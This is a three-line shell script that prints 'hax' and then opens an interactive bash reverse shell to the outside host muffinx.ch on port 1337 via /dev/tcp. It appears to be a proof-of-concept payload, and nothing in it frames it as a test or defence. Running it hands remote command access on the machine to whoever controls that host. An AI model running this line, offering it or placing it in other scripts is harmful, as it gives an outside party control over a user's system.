#!/bin/sh

echo hax
bash -i >& /dev/tcp/muffinx.ch/1337 0>&1
